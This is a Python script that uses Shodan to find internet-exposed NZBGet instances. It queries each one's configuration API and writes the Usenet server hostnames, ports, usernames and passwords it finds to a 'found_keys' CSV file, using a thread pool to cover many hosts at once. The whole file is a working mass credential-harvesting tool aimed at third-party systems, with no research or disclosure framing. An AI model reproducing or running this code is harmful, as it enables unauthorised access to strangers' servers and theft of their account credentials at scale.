import csv
from io import TextIOWrapper
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import os

import tqdm
import pynzbgetapi
import requests
import logging
from dotenv import load_dotenv
from shodan import Shodan
from colorama import init, Fore, Style

# Initialize colorama
init()

# Load environment variables from .env file
load_dotenv()

# Configure logging to log to both file and console
logging.basicConfig(level=logging.CRITICAL,
                    format='%(asctime)s - %(levelname)s - %(message)s',
                    handlers=[
                        logging.FileHandler('app.log'),
                        logging.StreamHandler()
                    ])

def extract_hostnames(csv_file_path):
    hostnames = []
    try:
        with open(csv_file_path, 'r', newline='') as csvfile:
            reader = csv.reader(csvfile)
            for row in reader:
                if row:  # Ensure the row is not empty
                    hostnames.append(row[0])
    except FileNotFoundError:
        logging.error(f"File not found: {csv_file_path}")
    except Exception as e:
        logging.error(f"An error occurred while reading the CSV file: {e}")
    return hostnames

def search_for_keys(url, output_file: TextIOWrapper):
    logging.info(f"Now searching {url}")
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        }

        ng_api = pynzbgetapi.NZBGetAPI(url, timeout=5)
        json_response = ng_api.config()
        servers_found = 0
        for item in json_response:
            if item['Name'].startswith('Server'):
                property_name = item["Name"].split(".", 1)[1]
                if property_name == 'Host':
                    servers_found += 1
                    output_file.write('\n')

                if property_name in ['Host', 'Username', 'Password', 'Port']:
                    output_file.write(item['Value'] + ';')
                if property_name == 'Connections':
                    output_file.write(item['Value'])

        output_file.flush()
        logging.info(f"Found {servers_found} servers in {url}")

    except requests.exceptions.Timeout:
        logging.warning(f"Connection to {url} timed out after 5 seconds.")
        raise  # Re-raise the exception to be caught by the caller
    except Exception as e:
        logging.error(f"An error occurred while trying to get {url}: {e}")
        raise  # Re-raise the exception to be caught by the caller

def main(csv_file_path, output_file_path):
    hostnames = extract_hostnames(csv_file_path)

    with open(output_file_path, 'w') as output_file:
        output_file.write("Host;Port;Username;Password;Connections")

        successful_searches = 0
        unsuccessful_searches = 0

        with ThreadPoolExecutor(max_workers=10) as executor:
            future_to_url = {
                executor.submit(search_for_keys,
                                hostname,
                                output_file): hostname for hostname in hostnames}

            with tqdm.tqdm(total=len(future_to_url), desc="Processing Hosts", unit="host", bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}]") as pbar:
                for future in as_completed(future_to_url):
                    url = future_to_url[future]
                    try:
                        future.result()
                        successful_searches += 1
                    except Exception as e:
                        logging.error(f"An error occurred while processing {url}: {e}")
                        unsuccessful_searches += 1
                    pbar.update(1)

        logging.info("Search completed.")
        logging.info(f"Successful searches: {successful_searches}")
        logging.info(f"Unsuccessful searches: {unsuccessful_searches}")

        print(f"\n{Fore.GREEN}Search completed.{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Successful searches:{Style.RESET_ALL} {successful_searches}")
        print(f"{Fore.RED}Unsuccessful searches:{Style.RESET_ALL} {unsuccessful_searches}")

def download_hosts():
    try:
        # Get the Shodan API key from the environment variable
        api_key = os.getenv('SHODAN_API_KEY')
        if not api_key:
            raise ValueError("Shodan API key not found in the environment variables.")

        # Initialize the Shodan API client
        shodan_api = Shodan(api_key)

        print(f"{Fore.YELLOW}Searching Shodan for hosts...{Style.RESET_ALL}")

        # Search Shodan for "nzbget 200 ok"
        results = shodan_api.search_cursor("nzbget 200 ok")

        # Extract the hostnames and ports from the search results
        hostnames_ports = []
        with tqdm.tqdm(desc="Shodan Search Progress", unit="result", bar_format="{l_bar}{bar}| {n_fmt} results [{elapsed}<{remaining}]") as pbar:
            for result in results:
                hostnames_ports.append(f"{result['ip_str']}:{result['port']}")
                pbar.update(1)

        print(f"{Fore.GREEN}Shodan search completed.{Style.RESET_ALL}")

        # Save results to file
        if hostnames_ports:
            with open('shodan_results.txt', 'w') as f:
                for item in tqdm.tqdm(hostnames_ports, desc="Saving Hosts", unit="host", bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}]"):
                    f.write("%s\n" % item)

            print(f"{Fore.GREEN}Fresh list of hosts downloaded from Shodan.{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}No hosts found in Shodan search.{Style.RESET_ALL}")

    except Exception as e:
        logging.error(f"An error occurred while downloading hosts from Shodan: {e}")

def simple_tui():
    download_choice = input("Do you want to download a fresh list of hosts from Shodan and use that instead? (y/n): ")
    if download_choice.lower() == 'y':
        download_hosts()
        csv_file_name = 'shodan_results.txt'
    else:
        csv_file_name = input("Enter name of CSV file (with or without '.csv'): ")
        if not csv_file_name.lower().endswith('.csv'):
            csv_file_name += '.csv'

    if os.path.isfile(csv_file_name):
        csvfilepaths = csv_file_name
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        outfilepathpath = f'found_keys_{timestamp}.csv'

        main(csvfilepaths, outfilepathpath)
    else:
        print(f"{Fore.RED}File not found: {csv_file_name}{Style.RESET_ALL}")

if __name__ == '__main__':
    try:
        simple_tui()
    except KeyboardInterrupt:
        logging.info("Program interrupted by user.")
    except Exception as e:
        logging.critical(f"An unexpected error occurred: {e}")
